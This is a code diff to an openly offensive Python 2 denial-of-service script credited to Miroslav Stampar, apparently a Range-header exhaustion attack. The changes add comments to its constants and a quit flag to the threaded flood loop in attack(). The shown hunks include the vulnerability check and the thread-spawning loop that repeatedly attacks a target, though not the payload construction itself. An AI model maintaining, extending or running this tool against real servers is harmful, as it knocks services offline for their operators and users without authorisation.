@@ -7,9 +7,9 @@ VERSION = "0.1a"
 AUTHOR  = "Miroslav Stampar (http://unconciousmind.blogspot.com | @stamparm)"
 LICENSE = "Public domain (FREE)"
 
-SLEEP_TIME = 5
-RECV_SIZE = 100
-RANGE_NUMBER = 1024
+SLEEP_TIME = 5          # time to wait for new thread slots (after max number reached)
+RECV_SIZE = 100         # receive buffer size in testing mode
+RANGE_NUMBER = 1024     # number of range subitems forming the DoS payload
 
 def attack(target):
     def _send(recv=False):
@@ -34,7 +34,8 @@ def attack(target):
         print "(x) Target does not seem to be vulnerable"
     else:
         try:
-            while True:
+            quit = False
+            while not quit:
                 threads = []
                 print "(i) Creating new threads..."
                 try:
@@ -43,6 +44,7 @@ def attack(target):
                         thread.start()
                         threads.append(thread)
                 except KeyboardInterrupt:
+                    quit = True
                     raise
                 except Exception, msg:
                     if 'new thread' in str(msg):
@@ -50,9 +52,10 @@ def attack(target):
                     else:
                         print "(x) Exception occured ('%s')" % msg
                 finally:
-                    print "(o) Waiting for %d seconds to acquire new threads" % SLEEP_TIME
-                    time.sleep(SLEEP_TIME)
-                    print
+                    if not quit:
+                        print "(o) Waiting for %d seconds to acquire new threads" % SLEEP_TIME
+                        time.sleep(SLEEP_TIME)
+                        print
         except KeyboardInterrupt:
             print "\r(x) Ctrl-C was pressed"
             os._exit(1)
